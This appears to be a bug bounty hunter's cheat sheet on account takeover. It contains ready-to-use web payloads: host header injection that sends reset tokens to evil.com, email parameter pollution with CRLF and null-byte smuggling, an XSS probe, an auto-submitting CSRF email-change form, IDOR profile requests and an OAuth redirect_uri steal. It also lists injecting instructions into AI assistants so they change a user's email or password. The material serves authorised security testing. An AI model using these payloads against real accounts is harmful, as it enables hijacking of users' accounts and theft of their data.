---
tags: [bugbounty, misc/ato, cheatsheet, p1, p2]
aliases: [Account Takeover, ATO]
cssclasses: [bb-hunter]
updated: 2026-04-21
---

# Account Takeover (ATO)

> [!tldr] Hunter Summary
> **What:** Any technique that results in accessing another user's account.
> **Impact:** P1 (critical) in nearly every program.
> **Best vectors:** Password reset flaws, OAuth misconfig, CSRF on email change, IDOR on account update.
> **Time to triage:** Vary by method. Password reset = 10 min. OAuth = 20 min.

---

## ATO Attack Matrix

| Method | Prerequisites | Stealth |
|--------|--------------|---------|
| Password reset link steal | Host header injection or param pollution | Medium |
| OAuth pre-account takeover | Victim's email known | High |
| CSRF email change | Victim clicks link | Medium |
| IDOR on account update | ID prediction | High |
| 2FA bypass | Account creds | High |
| Session fixation | None | Medium |
| Token theft via XSS | Stored XSS | Low |
| Credential stuffing | Leaked credentials | High |

---

## Vector 1 — Password Reset Flaws

### Host header injection on reset link
```http
POST /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

email=victim@gmail.com
```
Victim receives: `Click to reset: https://evil.com/reset?token=REAL_TOKEN`

### Parameter pollution
```http
POST /reset HTTP/1.1

email=victim@mail.com&email=attacker@mail.com
email=victim@mail.com,attacker@mail.com
email=victim@mail.com|attacker@mail.com
email=victim@mail.com%0a%0dcc:attacker@mail.com
email=victim@mail.com%00attacker@mail.com
```

### Token predictability
- Is the token generated from timestamp? Try generating at same second.
- Token = MD5/SHA1(email + timestamp)? Compute it.
- Token is sequential? Grab one for your account and try +1/-1.

### Short OTP + no rate limit
- 4-digit OTP: only 10000 combinations
- 6-digit: 1 million — feasible if no lockout

### XSS in reset form (reflected into page)
```
email="<svg/onload=alert(1)>"@gmail.com
# If email is reflected in the page without encoding
```

---

## Vector 2 — OAuth Pre-Account Takeover

### Method A: Pre-create via OAuth
1. Attacker creates account on target via OAuth (Google/GitHub) using victim's email
2. Victim tries normal signup → "email already exists"
3. Victim can't recover → attacker keeps access

### Method B: Pre-create via normal signup
1. Attacker signs up with victim's email + password
2. Victim tries to sign up with OAuth → platform links to attacker's account
3. Attacker uses their password to log in as victim

### Method C: Token reuse / re-sign
```
# Sign up with victim@gmail.com → sign up again with same email, different password
POST /newaccount
email=victim@gmail.com&password=attacker_password
# Second registration overrides first? = ATO
```

---

## Vector 3 — CSRF on Account Settings
```html
<!-- Email change CSRF PoC -->
<html>
<body onload="document.forms[0].submit()">
  <form action="https://target.com/account/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com"/>
  </form>
</body>
</html>
```

After victim's email changes → attacker uses "forgot password" → full ATO.

---

## Vector 4 — IDOR on Account Update
```http
# Own account update
POST /api/user/profile
Authorization: Bearer ATTACKER_TOKEN
{"user_id": "ATTACKER_ID", "email": "attacker@evil.com"}

# Change user_id to victim:
POST /api/user/profile  
{"user_id": "VICTIM_ID", "email": "attacker@evil.com"}
```

---

## Vector 5 — Session Fixation
1. Attacker gets unauthenticated session token
2. Tricks victim into using that session (URL param, cookie injection)
3. Victim logs in — server keeps same session ID
4. Attacker's session is now authenticated

---

## Vector 6 — OAuth Redirect URI Steal
```
# Step 1: Manipulate redirect_uri
GET /authorize?client_id=X&redirect_uri=https://evil.com&...

# Step 2: Auth code sent to evil.com
# Step 3: Exchange code for access token
POST /token
code=STOLEN_CODE&redirect_uri=https://evil.com&...
```

---

## 2025-2026 Updates

> [!info] New ATO vectors (2025-2026)
> - **Passkey bypass:** Some apps implement passkeys but keep password login as fallback — brute force the fallback
> - **AI chatbot impersonation:** AI assistants that send emails or take actions "on behalf of user" — inject instructions to change email/password
> - **Magic link open redirect:** Magic login link with `next=` redirect → steal the token via redirect
> - **WebAuthn partial bypass:** FIDO2 challenges that don't bind to session — replay in different session
> - **Account merge takeover:** "Connect accounts" or account merge functionality — merge victim's account into attacker's

---

## Chain Ideas

| Start → | Via → | Result |
|---------|-------|--------|
| Open redirect | + OAuth code | → ATO |
| XSS | + cookie theft | → ATO |
| IDOR | + email change | → ATO via password reset |
| CSRF | + email change | → ATO via password reset |
| 2FA bypass | + password | → ATO |
| Host header injection | + password reset | → ATO |

---

## References

- PortSwigger Authentication — https://portswigger.net/web-security/authentication
- Vijetareigns OAuth ATO writeup
- zseano "re-signing up leads to ATO"
